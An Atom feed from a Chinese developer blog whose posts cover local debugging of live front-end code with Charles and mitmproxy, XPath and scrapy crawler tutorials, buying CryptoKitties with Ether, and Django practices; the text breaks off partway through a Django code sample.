<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>facert 的杂货店</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yousite.com/"/>
  <updated>2018-01-27T15:50:15.669Z</updated>
  <id>http://yousite.com/</id>
  
  <author>
    <name>facert</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>前端线上调试指南</title>
    <link href="http://yousite.com/2018/01/27/%E5%89%8D%E7%AB%AF%E7%BA%BF%E4%B8%8A%E8%B0%83%E8%AF%95%E6%8C%87%E5%8D%97/"/>
    <id>http://yousite.com/2018/01/27/前端线上调试指南/</id>
    <published>2018-01-27T09:46:08.000Z</published>
    <updated>2018-01-27T15:50:15.669Z</updated>
    
    <content type="html"><![CDATA[<h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><p>前端工程师可能会遇到如下的场景：测试环境功能都 ok ，到了生产环境就出问题，改完 bug 上线后发现又引入了新的问题。只能再次重复这个过程。</p><p>所以能不能不上线，将本地代码直接作用于线上，来调试功能呢。</p><p>我们有如下工具可以选择 fiddler (windows), charles (mac), mitmproxy (可自定义脚本)</p><p>下面我们举 charles 和 mitmproxy 为例子说明<br><a id="more"></a></p><h5 id="charles"><a href="#charles" class="headerlink" title="charles"></a>charles</h5><ol><li><p>打开 charles, 点击 Tools -&gt; Map Local -&gt; Add， 将需要的 Path 映射到 Local path （自己的本地目录），然后找到自己需要映射的目录或文件，（比如 js 目录）。</p><p><img src="/media/15170629957005.jpg" alt=""></p></li></ol><ol><li>这里面我们也可以选择 Map Remote 模式，它能映射到 url 地址，如 www.example.com/js -&gt; test.example.com/js</li></ol><ol><li>接下来我们只需让浏览器代理到 charles 即可，charles 默认开启的是 http 代理，8888 端口</li></ol><ul><li>Chrome 用户下载插件 switchyOmega，配置如下</li></ul><p><img src="/media/15170631701355.jpg" alt=""></p><ul><li>Safari 用户不用装插件，只需 charles -&gt; Proxy -&gt; MacosProxy 选中即可。</li></ul><ol><li>配置完成！接下来你本地对 js 的改动，直接能够作用在 exampel.com 上。</li></ol><h5 id="mitmproxy"><a href="#mitmproxy" class="headerlink" title="mitmproxy"></a>mitmproxy</h5><p>mitmproxy 没有界面，只能在终端运行，不过它可以定制 python 插件，实现想要的功能。</p><p>接下来我先介绍下原理，为什么本地的文件能直接作用于线上。</p><p>原理在于我们使用了代理，或者更准确一点叫中间人劫持，不过这个中间人是我们自己。</p><p>代理软件在代理我们访问的网页时，会根据我们配置的规则修改返回给我们的内容，比如我们访问 example.com/js/a.js 的时候，发现我们配置了规则是去本地找 a.js 这个文件，找到这个文件，拿到内容后，会直接将 response 的 boby 内容改成本地的内容，这样浏览器就会根据本地内容做渲染。</p><p>我们用 mitmproxy 的脚本来实现，自定义一个文件 test.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import glob</span><br><span class="line">from mitmproxy import http</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 拿到本地 a.js 的内容</span><br><span class="line">main_js = glob.glob(&apos;./js/a\.js&apos;)</span><br><span class="line">main_content = &apos;&apos;</span><br><span class="line">if main_js:</span><br><span class="line">    with open(main_js[0]) as f:</span><br><span class="line">        main_content = f.read()</span><br><span class="line"></span><br><span class="line"># 匹配 example.com/js/a.js 的内容</span><br><span class="line">pattern = re.compile(&quot;http://example\.com/js/a\.js&quot;)</span><br><span class="line"></span><br><span class="line">def request(flow: http.HTTPFlow) -&gt; None:</span><br><span class="line">    if pattern.match(flow.request.pretty_url):</span><br><span class="line">        flow.response = http.HTTPResponse.make(</span><br><span class="line">            200,</span><br><span class="line">            main_content,</span><br><span class="line">            &#123;&quot;Content-Type&quot;: &quot;application/javascript&quot;,</span><br><span class="line">             &quot;Content-Encoding&quot;: &quot;gzip&quot;&#125;</span><br><span class="line">        )</span><br></pre></td></tr></table></figure><p>然后运行 <code>mitmdump  -s test.py</code> 就可达到和 charles 一样的效果。</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;场景&quot;&gt;&lt;a href=&quot;#场景&quot; class=&quot;headerlink&quot; title=&quot;场景&quot;&gt;&lt;/a&gt;场景&lt;/h4&gt;&lt;p&gt;前端工程师可能会遇到如下的场景：测试环境功能都 ok ，到了生产环境就出问题，改完 bug 上线后发现又引入了新的问题。只能再次重复这个过程。&lt;/p&gt;
&lt;p&gt;所以能不能不上线，将本地代码直接作用于线上，来调试功能呢。&lt;/p&gt;
&lt;p&gt;我们有如下工具可以选择 fiddler (windows), charles (mac), mitmproxy (可自定义脚本)&lt;/p&gt;
&lt;p&gt;下面我们举 charles 和 mitmproxy 为例子说明&lt;br&gt;
    
    </summary>
    
    
      <category term="前端" scheme="http://yousite.com/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>开源【动态可配化爬虫】代码</title>
    <link href="http://yousite.com/2018/01/13/%E5%BC%80%E6%BA%90%E3%80%90%E5%8A%A8%E6%80%81%E5%8F%AF%E9%85%8D%E5%8C%96%E7%88%AC%E8%99%AB%E3%80%91%E4%BB%A3%E7%A0%81/"/>
    <id>http://yousite.com/2018/01/13/开源【动态可配化爬虫】代码/</id>
    <published>2018-01-13T06:17:37.000Z</published>
    <updated>2018-01-27T14:46:12.907Z</updated>
    
    <content type="html"><![CDATA[<p>继上篇文章 <a href="https://zhuanlan.zhihu.com/p/31659456" target="_blank" rel="noopener">动态可配置化 Python 爬虫</a> 说过的 Todo 项一直没有精力去维护，索性开源代码，让各位自己去折腾完善，欢迎提 pr。</p><p>项目地址：<a href="https://github.com/facert/scrapy_helper" target="_blank" rel="noopener">https://github.com/facert/scrapy_helper</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;继上篇文章 &lt;a href=&quot;https://zhuanlan.zhihu.com/p/31659456&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;动态可配置化 Python 爬虫&lt;/a&gt; 说过的 Todo 项一直没有精力去维护，索性开源代码，让各位自
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>以太坊云撸猫教程</title>
    <link href="http://yousite.com/2017/12/10/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E4%BA%91%E6%92%B8%E7%8C%AB%E6%95%99%E7%A8%8B/"/>
    <id>http://yousite.com/2017/12/10/以太坊云撸猫教程/</id>
    <published>2017-12-10T04:12:11.000Z</published>
    <updated>2018-01-27T14:46:59.950Z</updated>
    
    <content type="html"><![CDATA[<p>最近听说以太坊上能撸猫了，而且据说还能养猫赚钱，有些猫的价格已经高的离谱，按今天一个以太币 = 2800 ¥ 的节奏，1000 个 就是 280 w。</p><p><img src="/media/15128794800292.jpg" alt=""></p><p>那么作为国内的普通用户想尝试下养一只猫该怎么办呢，因为可能大家没有任何虚拟币，而且很多国内的渠道都已经封闭，但是买猫的话只能通过以太币购买。</p><p>下面介绍一下我使用的方法<br><a id="more"></a></p><h4 id="0x01-买入以太币"><a href="#0x01-买入以太币" class="headerlink" title="0x01 买入以太币"></a>0x01 买入以太币</h4><p>首先声明我和任何比特币交易所没有关系，下文提到的火币只是因为之前用过，所以比较熟悉操作流程。另外我的方法肯定不是最省钱（由于手续费的存在）的方式，这里只是给没有玩过币又想买猫的人的提供一个思路。</p><ol><li><p>由于现在买币的各种限制，国内只能通过 c2c 交易买到相应的币，c2c 是指由平台担保，个人之间交易虚拟币的模式。所以我们需要先注册 <a href="https://www.huobi.com/" target="_blank" rel="noopener">https://www.huobi.com/</a> 火币网的的账户，点击购买比特币（由于目前火币 c2c 只开通了 btc 和 usdt 的交易，没有 eth 的交易），这里需要先通过实名认证才能买入 btc。</p></li><li><p>接下来就是选择商家，选择买入的量，点击确认买入，就生成了一个订单。</p><p> <img src="/media/15128807798929.jpg" alt=""></p></li></ol><ol><li><p>然后按照他们指定的方法（支付宝，微信，银行卡转账）打完钱后，并沟通完成后，一般几分钟内就可以看到自己的账户已经入账比特币。<br><img src="/media/15128809494939.jpg" alt="">  </p></li><li><p>接下来点击资金管理，选择与火币 Pro 互转，将买入的比特币转入 Pro 账户，这样才能通过交易所将 比特币换成 以太币。</p></li><li><p>转入后我们进入 <a href="https://www.huobi.pro/zh-cn/btc_usdt/exchange/" target="_blank" rel="noopener">https://www.huobi.pro/zh-cn/btc_usdt/exchange/</a> 交易。这里面一定要看清楚买入的是 eth</p><p> <img src="/media/15128813947643.jpg" alt=""></p></li><li><p>买入成交后就可以看到自己 Pro 账户的资产有 eth 的份额了。 <a href="https://www.huobi.pro/zh-cn/finance/" target="_blank" rel="noopener">https://www.huobi.pro/zh-cn/finance/</a></p></li></ol><h4 id="0x02-以太币钱包"><a href="#0x02-以太币钱包" class="headerlink" title="0x02 以太币钱包"></a>0x02 以太币钱包</h4><p>接下来我们要做的是将交易所的 eth 提取到自己的钱包中。</p><ol><li><p>首先我们需要有自己的以太坊钱包，这里面介绍一种 chrome 插件的钱包 MetaMask。首先去 chrome 的应用商店下载 MetaMask </p><p> <img src="/media/15128863554431.jpg" alt=""></p></li></ol><pre><code>![](/media/15128818707667.jpg)</code></pre><ol><li><p>下载注册完成后，就有自己以太币的钱包了，这里一定要保存好自己的私钥，就是那一串随机的字母。接下里我们拷贝钱包的地址，这个可以看成是自己对外交易的唯一账户名</p><p> <img src="/media/15128820941231.jpg" alt=""></p></li></ol><ol><li><p>钱包账户准备好后，我们进入火币网的提币地址管理界面，<a href="https://www.huobi.pro/zh-cn/withdraw_address/" target="_blank" rel="noopener">https://www.huobi.pro/zh-cn/withdraw_address/</a> ，设置提币地址</p><p> <img src="/media/15128865672492.jpg" alt=""></p></li><li><p>设置完成后，去资产页面提币即可</p><p> <img src="/media/15128866511594.jpg" alt=""></p></li><li><p>具体到账速度看当时以太网的网络状况，由于目前撸猫的人太多，导致以太网交易有些拥堵。交易被确认后可以在 MetaMask 看到自己的以太币余额。</p></li></ol><h4 id="0x03-买猫"><a href="#0x03-买猫" class="headerlink" title="0x03 买猫"></a>0x03 买猫</h4><ol><li>接下来可以在 <a href="https://www.cryptokitties.co/marketplace" target="_blank" rel="noopener">https://www.cryptokitties.co/marketplace</a> 挑选自己心仪的猫，具体怎么挑，什么样的属性有价值，这边就不多介绍了。</li><li>选择完点击 BUY NOW, 最后会出现下图的弹窗，GAS LIMIT 是指让节点执行多少次指令（因为以太网开发的智能合约是图灵完备的，所以有可能陷入死循环，所以需要指定运行多少次后停止）， GAS PRICE 指的是你愿意为本次交易的一个单位 gas 愿意支付的手续费, 1 wei = 1/10^18 eth</li></ol><p><img src="/media/15128871715300.jpg" alt=""></p><ol><li>点击 BUY EHTER 即可完成支付，然后只需等待，只要最终全网确认完成，你就有自己的猫啦！</li></ol><p><img src="/media/15128877725672.jpg" alt=""></p><h4 id="0x04-其他"><a href="#0x04-其他" class="headerlink" title="0x04 其他"></a>0x04 其他</h4><p>最后希望大家以平常心看待这个游戏;-)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近听说以太坊上能撸猫了，而且据说还能养猫赚钱，有些猫的价格已经高的离谱，按今天一个以太币 = 2800 ¥ 的节奏，1000 个 就是 280 w。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/media/15128794800292.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;那么作为国内的普通用户想尝试下养一只猫该怎么办呢，因为可能大家没有任何虚拟币，而且很多国内的渠道都已经封闭，但是买猫的话只能通过以太币购买。&lt;/p&gt;
&lt;p&gt;下面介绍一下我使用的方法&lt;br&gt;
    
    </summary>
    
    
      <category term="以太坊，区块链" scheme="http://yousite.com/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A%EF%BC%8C%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>xpath 使用教程</title>
    <link href="http://yousite.com/2017/12/03/xpath-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
    <id>http://yousite.com/2017/12/03/xpath-使用教程/</id>
    <published>2017-12-03T13:26:31.000Z</published>
    <updated>2017-12-03T14:06:15.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;div class=&quot;demo&quot;&gt;</span><br><span class="line">   &lt;span&gt;</span><br><span class="line">   &lt;/span&gt;</span><br><span class="line">   &lt;ul&gt;</span><br><span class="line">       &lt;li class=&quot;item-0&quot;&gt;</span><br><span class="line">           &lt;a href=&quot;link-0&quot;&gt;link0-item&lt;/a&gt;</span><br><span class="line">       &lt;/li&gt;</span><br><span class="line">       &lt;li class=&quot;item-1&quot;&gt;</span><br><span class="line">           &lt;a href=&quot;link-1&quot;&gt;link1-item&lt;/a&gt;</span><br><span class="line">       &lt;/li&gt;</span><br><span class="line">       &lt;li class=&quot;item-2&quot;&gt;</span><br><span class="line">           &lt;a href=&quot;link-2&quot;&gt;link2-item&lt;/a&gt;</span><br><span class="line">       &lt;/li&gt;</span><br><span class="line">   &lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>这篇文章列举常用的一些 xpath 用法，以便同学们更好的理解使用 <a href="http://www.anycrawl.info/" target="_blank" rel="noopener">http://www.anycrawl.info/</a> 这个网站</p><ol><li><code>//div</code> (获取所有 div 元素，不管在文档什么位置)</li><li><code>/div</code> (获取根路径 div 元素)</li><li><code>//div/span</code> (获取 div 元素下一级的 span 元素)</li><li><code>//div//span</code> (获取 div 元素所有后代的 span)</li><li><code>//ul/li[1]</code> (获取 ul 子元素下的第一个 li 元素)</li><li><code>//ul/li[last()]</code> (获取 ul 子元素下的最后一个 li 元素)</li><li><code>//div[@class=&quot;demo&quot;]</code> (获取 class 为 demo 的 div 元素)</li><li><code>//ul/li/a/@href</code> (获取 ul&gt;li&gt;a 链接的 href 属性)</li><li><code>//ul/li/a/text()</code> (获取 ul&gt;li&gt;a 链接的内容)</li><li><code>//*[@class=&quot;item-0&quot;]</code> (获取 class 为 item-0 的元素)</li><li><code>//*[contains(@class, &quot;de&quot;)]</code> (获取 class 元素包含 de 的元素)</li></ol><h4 id="参考手册：xpath-cheatsheet"><a href="#参考手册：xpath-cheatsheet" class="headerlink" title="参考手册：xpath cheatsheet "></a>参考手册：<a href="http://www.cheat-sheets.org/saved-copy/Locators_table_1_0_2.pdf" target="_blank" rel="noopener">xpath cheatsheet </a></h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>动态可配置化 Python 爬虫教程</title>
    <link href="http://yousite.com/2017/12/03/%E5%8A%A8%E6%80%81%E5%8F%AF%E9%85%8D%E7%BD%AE%E5%8C%96%20Python%20%E7%88%AC%E8%99%AB%E6%95%99%E7%A8%8B/"/>
    <id>http://yousite.com/2017/12/03/动态可配置化 Python 爬虫教程/</id>
    <published>2017-12-03T10:48:21.000Z</published>
    <updated>2018-01-27T14:47:04.372Z</updated>
    
    <content type="html"><![CDATA[<p>爬虫大家都很熟悉，像 scrapy 这种 Python 爬虫框架也很成熟，不过每写一个爬虫都得重新复制一份代码，这部分如果做成可配置的话，能相应减少一些工作量，对新手也会友好些，所以我花了点时间，开发了一个动态可配置的爬虫网站 <a href="http://www.anycrawl.info" target="_blank" rel="noopener">http://www.anycrawl.info</a> ，基于 scrapy ，提供一些配置项，5分钟就可生成一个通用爬虫，并可直接下载代码使用。</p><p>我举 <a href="http://www.anycrawl.info/project/15/" target="_blank" rel="noopener">http://www.anycrawl.info/project/15/</a> 豆瓣小组爬虫的例子来介绍下网站的使用方法。<br><a id="more"></a></p><h4 id="0x00-需求"><a href="#0x00-需求" class="headerlink" title="0x00 需求"></a>0x00 需求</h4><p><img src="/media/15123009061075.jpg" alt=""><br><img src="/media/15123009205239.jpg" alt=""></p><p>我们希望能够爬取害羞组下的所有话题的标题，作者，以及对应的内容和图片</p><h4 id="0x01-基础配置"><a href="#0x01-基础配置" class="headerlink" title="0x01 基础配置"></a>0x01 基础配置</h4><p>基础配置主要是 scrapy 的 settings.py 的一些选项</p><p><img src="/media/15122997289231.jpg" alt=""></p><ol><li>项目名，别名不说了，域名指的是 allowed_domains，也就是允许爬虫在哪些域名下爬取</li><li>爬虫开始的链接指的是 start_urls，指的是爬虫从哪个链接开始爬取，比如，<a href="https://www.douban.com/group/haixiuzu/discussion" target="_blank" rel="noopener">https://www.douban.com/group/haixiuzu/discussion</a> ， 从豆瓣害羞组的第一页爬取。</li><li><p>保存数据的方式，目前支持 json, csv, image, mongodb, elasticsearch。(如果选择 image 的方式，则需要在下面配置规则的时候，选择保存图片链接 到 image_urls 这个字段，scrapy 会自动下载图片。mongodb, elasticsearch 则需要自己在 settings.py 配置你的 host 和 port)</p><p>我们配置如下<br><img src="/media/15123038498788.jpg" alt=""></p></li></ol><h4 id="0x02-规则列表"><a href="#0x02-规则列表" class="headerlink" title="0x02 规则列表"></a>0x02 规则列表</h4><p><img src="/media/15123004064954.jpg" alt=""></p><ol><li>规则列表分成两部分，链接正则 和 xpath 规则，必须先配置链接正则，链接正则对应的概念是 scrapy 的 Rule 的概念，意思是根据你给定的链接正则去匹配，如果匹配的到，则执行回调函数 callback, callback 可以为空，如果为空，则放入队列中。</li></ol><p><img src="/media/15123005270324.jpg" alt=""></p><p>如上面 <code>/group/\w+/discussion\?start=[0-9]{0,4}$</code> 这个对应的是小组分页的链接正则，遇到这些链接，只要丢到队列中，由 scrapy 下次处理，<code>/group/topic/\d+/</code> 这个对应的是话题的详情链接，遇到这些，则执行 parse_topic 函数，那么这个函数具体执行什么内容，这就看下面配置的 xpath 规则，<a href="https://zhuanlan.zhihu.com/p/31659319" target="_blank" rel="noopener">xpath 教程</a> ，如我们需要 title, author, description, create_time, image_urls 这几个字段，直接配置即可，只要能通过 xpath 语法找到。</p><p>配置完成后，会对应生成如下的源码：</p><p><img src="/media/15123045039778.jpg" alt=""></p><h4 id="0x03-爬取状态"><a href="#0x03-爬取状态" class="headerlink" title="0x03 爬取状态"></a>0x03 爬取状态</h4><p>点击提交后，就跳转到下载页面</p><p><img src="/media/15123045808565.jpg" alt=""></p><p>这里面有个数据指标的功能，记录你爬取的数目，目前看起来有点鸡肋，如果不需要记录，将 settings 里面的 COUNT_DATA 改为 False 就行。</p><h4 id="0x04-运行爬虫"><a href="#0x04-运行爬虫" class="headerlink" title="0x04 运行爬虫"></a>0x04 运行爬虫</h4><p>运行爬虫必须有 python 和 scrapy 环境，安装 python 和 pip 这里不介绍了，安装 scrapy 命令如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install scrapy</span><br></pre></td></tr></table></figure><p>然后下载刚才的项目代码，解压后，进入 output/xxxxxx 目录，执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python scripts.py</span><br></pre></td></tr></table></figure><p>或者直接用 scrapy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl &lt;项目名&gt;</span><br></pre></td></tr></table></figure><h4 id="0x05-Todo"><a href="#0x05-Todo" class="headerlink" title="0x05 Todo"></a>0x05 Todo</h4><ol><li>支持自动登录</li><li>支持动态爬取</li><li>api 接口爬虫</li><li>能适配更多爬取场景</li><li>支持 css 解析网页</li><li>其他</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;爬虫大家都很熟悉，像 scrapy 这种 Python 爬虫框架也很成熟，不过每写一个爬虫都得重新复制一份代码，这部分如果做成可配置的话，能相应减少一些工作量，对新手也会友好些，所以我花了点时间，开发了一个动态可配置的爬虫网站 &lt;a href=&quot;http://www.anycrawl.info&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.anycrawl.info&lt;/a&gt; ，基于 scrapy ，提供一些配置项，5分钟就可生成一个通用爬虫，并可直接下载代码使用。&lt;/p&gt;
&lt;p&gt;我举 &lt;a href=&quot;http://www.anycrawl.info/project/15/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.anycrawl.info/project/15/&lt;/a&gt; 豆瓣小组爬虫的例子来介绍下网站的使用方法。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>谈谈 django 应用实践</title>
    <link href="http://yousite.com/2017/10/11/%E8%B0%88%E8%B0%88-django-%E5%BA%94%E7%94%A8%E5%AE%9E%E8%B7%B5/"/>
    <id>http://yousite.com/2017/10/11/谈谈-django-应用实践/</id>
    <published>2017-10-11T15:56:33.000Z</published>
    <updated>2018-01-27T14:47:23.435Z</updated>
    
    <content type="html"><![CDATA[<p>python 的 web 框架非常多，比较出名的有 django, flask, tornado。django 作为一个老牌框架，无论是文档还是代码质量都非常高，另外他自带的 admin 后台和一些有用的 app，如果你的需求是做 cms 之类的 web 应用的话，基本上不用开发多少代码就能出一个成品。不过很多新手可能一开始不太适应他的设计模式，遇到问题后基本就懵了，所以这里我按照自己用 django 的经验，写一下 django 的一些应用实践，可能写的比较零散，大家见谅。</p><h3 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h3><p><img src="/media/15077390149599.png" alt=""></p><a id="more"></a><p>首先我们得了解下 django 这个框架整体的处理流程，假设我们采用 nginx + uwsgi + django 的 web server 模式</p><ol><li>一个请求过来后，首先经过 nginx 做反向代理，将请求转发到 uwsgi (python 用 wsgi 这种协议来解析 http 请求，uwsgi 是一个 解析 wsgi 的应用)，uwsgi 再将解析过的数据传到 django。</li><li>django 收到请求后，首先会经过一组全局的中间件 (middleware)，调用 process_request 作为预处理，比如解析用户状态，检验 csrf_token (post 请求)，如果有问题，则直接返回 response，不再调用 view 函数。否则，调用 process_view ，如果没问题进入 view 函数。</li><li>进入 view 函数后开发者可以写自己的逻辑，比如操作数据库，更新缓存，最后返回一个 response。</li><li>接下来 跳出 view 函数，重新进入 middleware，调用 process_response，对 response 做些最后的修饰，返回给用户。</li></ol><h3 id="views-模块"><a href="#views-模块" class="headerlink" title="views 模块"></a>views 模块</h3><ol><li>view 不仅可以用函数，也可以用通用视图类（generic_view），好处是：代码更加清晰，可以复用继承，并且结合 mixin 能够开发更加灵活的 view 模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def hello_fn(request, name=&quot;World&quot;):</span><br><span class="line">        return HttpResponse(&quot;Hellp &#123;&#125;!&quot;.format(name))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class FeedMixin(object):</span><br><span class="line">        def get_context_data(self, **kwargs):</span><br><span class="line">            context = super().get_context_data(**kwargs)</span><br><span class="line">            context[&quot;feed&quot;] = models.Post.objects.viewable_posts(self.request.user)</span><br><span class="line">            return context</span><br><span class="line">            </span><br><span class="line">class MyFeed(FeedMixin, generic.CreateView):</span><br><span class="line">        model = models.Post</span><br><span class="line">        template_name = &quot;myfeed.html&quot;</span><br><span class="line">        success_url = reverse_lazy(&quot;my_feed&quot;)</span><br></pre></td></tr></table></figure><ol><li>python 的装饰器很好用，也可以用于 views 函数， 比如下面的装饰器用于登录用户的检测</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@login_required</span><br><span class="line">def simple_view(request):</span><br><span class="line">       return HttpResponse()</span><br></pre></td></tr></table></figure><h3 id="urls-模块"><a href="#urls-模块" class="headerlink" title="urls 模块"></a>urls 模块</h3><ol><li>urls.py 这个文件将访问的 url 跟 view 模块对应起来，按从上到下的顺序匹配</li><li>采用 include 函数可以包含其他 app 的 urls，namespace 参数定义后可以在模板中直接调用，比如 </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% url &apos;articles&apos;%&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(r&apos;^articles/$&apos;, include(articles.urls), namespace=&quot;articles&quot;),</span><br></pre></td></tr></table></figure><h3 id="models-模块"><a href="#models-模块" class="headerlink" title="models 模块"></a>models 模块</h3><ol><li>model 是具有处理数据库的一种面向对象的方法的类，能够让不熟悉数据库语句的程序员也能快速操作数据库</li><li>采用面向对象的方式创建类，加上 <code>abstract = True</code> 则为抽象类</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class Postable(models.Model):</span><br><span class="line">    created = models.DateTimeField(auto_now_add=True)</span><br><span class="line">    modified = modified.DateTimeField(auto_now=True)</span><br><span class="line">    message = models.TextField(max_length=500)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        abstract = True</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">class Post(Postable):</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Comment(Postable):</span><br><span class="line">   ···</span><br></pre></td></tr></table></figure><ol><li>django 表对应关系有一对一（OneToOneField），一对多 (ForeignKey)，多对多 (ManyToManyField)，其中 多对多的模式通过创建一个中间表来实现。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Book(models.Model):</span><br><span class="line">    place = models.OneToOneField(Place, primary_key=True)</span><br><span class="line">    pub=models.ForeignKey(Publisher)</span><br><span class="line">    authors=models.ManyToManyField(Author)</span><br></pre></td></tr></table></figure><p>上面的例子中间表包括 author_id 和 book_id </p><ol><li>django 的 signal 实现 hook 数据库写行为，比如，pre_save, post_save，pre_delete, post_delete，你也可以自定义 signal, hook 其他行为。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@receiver(post_save, sender=TransactionDetail, dispatch_uid=&quot;update_stock_count&quot;)</span><br><span class="line">def update_stock(sender, instance, **kwargs):</span><br><span class="line">     instance.product.stock -= instance.amount</span><br><span class="line">     instance.product.save()</span><br></pre></td></tr></table></figure><ol><li>Person.objects.all(), 这里面的 objects 其实是个 manager， 实现了 all, filter 等函数，可以自定义。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Person(models.Model):</span><br><span class="line">    #...</span><br><span class="line">    object = models.Manager()</span><br></pre></td></tr></table></figure><ol><li>django 的 queryset 是惰性的，只有在真正用的时候才会去数据库查询，并且查询一次后，会有缓存，当再次遍历这个 queryset 的时候，不会再去查询。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person_set = Person.objects.filter(first_name=&quot;Dave&quot;)</span><br></pre></td></tr></table></figure><ol><li><p>数据库第一次创建后，会有再次更新字段的需求。django 在 1.4 版本前并没有这个功能，得用第三方库 south 来更新，后来的版本 django 自带了 migration 功能，能够将最新的 model 版本和数据库的字段作对比，自动生成 migration 文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python manage.py makemigrations # 生成 migration 文件</span><br><span class="line">python manage.py migrate # 将更改应用到数据库</span><br></pre></td></tr></table></figure></li><li><p>orm 不能直接看到 raw sql 语句，可以通过如下语句查看 sql</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 